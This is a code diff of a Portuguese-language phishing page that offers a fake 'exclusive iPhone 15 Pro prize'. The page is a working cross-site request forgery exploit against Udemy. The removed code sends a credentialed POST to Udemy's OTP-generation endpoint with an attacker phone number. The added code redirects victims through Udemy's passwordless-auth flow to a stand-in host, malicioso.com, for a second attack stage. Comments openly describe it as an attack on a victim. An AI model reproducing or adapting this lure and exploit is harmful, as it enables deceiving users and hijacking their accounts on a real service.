@@ -1,60 +1,80 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Sistema de Recompensas</title>
+    <title>Ganhe um Prêmio Exclusivo!</title>
     <style>
-        body { font-family: Arial; text-align: center; padding: 20px; }
-        .container { max-width: 600px; margin: 0 auto; }
-        .btn { background: #4CAF50; color: white; padding: 10px 20px; border: none; cursor: pointer; }
-        .steps { text-align: left; margin: 20px 0; }
+        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 600px; margin: 0 auto; padding: 20px; }
+        h1 { color: #e53935; }
+        .btn { background: #e53935; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        .prize-box { border: 1px solid #ddd; padding: 20px; margin: 20px 0; border-radius: 4px; text-align: center; }
+        .steps { margin-bottom: 20px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🎁 Resgate sua recompensa exclusiva!</h1>
-        
+    <h1>🎉 Parabéns! Você foi selecionado para um prêmio exclusivo!</h1>
+    
+    <div class="prize-box">
+        <h2>iPhone 15 Pro</h2>
+        <p>Restam apenas <strong>2</strong> unidades disponíveis para resgate hoje.</p>
+        <button id="claim-btn" class="btn">RESGATAR AGORA</button>
+    </div>
+    
+    <div id="steps-container" style="display: none;">
+        <h3>Quase lá! Complete estes passos rápidos:</h3>
         <div class="steps">
-            <h3>Para resgatar seu prêmio:</h3>
-            <ol>
-                <li>Clique no botão abaixo para fazer login (se necessário)</li>
-                <li>Após o login, retorne para esta página</li>
-                <li>Clique no botão "Resgatar Prêmio" que aparecerá</li>
-                <li>Seu prêmio será enviado para seu telefone registrado</li>
-            </ol>
-        </div>
-        
-        <button id="login-button" class="btn">Fazer Login no Site</button>
-        <div id="step2" style="display:none; margin-top: 30px;">
-            <h3>Agora clique abaixo para resgatar seu prêmio:</h3>
-            <button id="claim-button" class="btn">RESGATAR PRÊMIO AGORA</button>
+            <p>✅ <strong>Passo 1:</strong> <span id="step1-text">Verificando sua elegibilidade...</span></p>
+            <p id="step2" style="color: #999;">⏳ <strong>Passo 2:</strong> Confirmando seus dados...</p>
+            <p id="step3" style="color: #999;">⏳ <strong>Passo 3:</strong> Registrando seu prêmio...</p>
         </div>
     </div>
     
+    <!-- Este iframe será usado para a primeira requisição -->
+    <iframe id="auth-frame" style="display: none;"></iframe>
+    
     <script>
-        document.getElementById('login-button').addEventListener('click', function() {
-            // Abre o site em uma nova aba para o usuário fazer login
-            window.open('https://www.udemy.com/join/passwordless-auth/?locale=en_US&next=https%3A%2F%2Fwww.udemy.com%2Flogout%2F&response_type=html&action=login&mode', '_blank');
+        // Armazena o estado do ataque
+        let attackState = {
+            started: false,
+            getRequestSent: false,
+            getRequestCompleted: false,
+            postRequestSent: false,
+            targetPhone: "+5514996810417"  // Número de telefone a ser inserido
+        };
+        
+        // Gerencia o fluxo de ataque
+        document.getElementById('claim-btn').addEventListener('click', function() {
+            // Esconde o botão e mostra os passos
+            this.disabled = true;
+            this.textContent = "Processando...";
+            document.getElementById('steps-container').style.display = 'block';
             
-            // Mostra o próximo passo quando o usuário retornar
-            this.textContent = "Já fiz login";
-            document.getElementById('step2').style.display = 'block';
+            // Inicia o ataque - Primeira etapa: requisição top-level GET
+            initiateAttack();
         });
         
-        document.getElementById('claim-button').addEventListener('click', function() {
-            // Cria e submete o formulário malicioso quando o usuário clicar
-            var xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://www.udemy.com/api-2.0/auth/non-auth-otp/generate/', true);
-                xhr.withCredentials = true;
-                xhr.setRequestHeader('Content-Type', 'application/json');
-                xhr.send(JSON.stringify({
-                    "purpose": 3,
-                    "phone_number": "+5514996810417"
-                }));
-            console.log(">>",xhr)
-            // Mostra mensagem de sucesso
-            this.textContent = "Prêmio Resgatado!";
-            this.disabled = true;
-        });
+        function initiateAttack() {
+            // Marca que o ataque começou
+            attackState.started = true;
+            
+            // Atualiza o status do passo 1
+            document.getElementById('step1-text').textContent = "Verificação em andamento...";
+            
+            // Armazena informações no localStorage para persistir entre redirecionamentos
+            localStorage.setItem('csrf_attack_state', JSON.stringify(attackState));
+            
+            // Redireciona para o site alvo usando uma navegação top-level GET
+            // Isto enviará os cookies SameSite=Lax
+            setTimeout(() => {
+                document.getElementById('step1-text').textContent = "Redirecionando para verificação...";
+                
+                // PRIMEIRO ESTÁGIO: GET para estabelecer cookies/sessão
+                window.location.href = "https://www.udemy.com/join/passwordless-auth/?locale=en_US&next=" + 
+                    encodeURIComponent("https://malicioso.com/csrf-stage2.html");
+                
+                // Depois do redirecionamento, a vítima será enviada para csrf-stage2.html
+                // que completará o segundo estágio do ataque
+            }, 1500);
+        }
     </script>
 </body>
 </html>
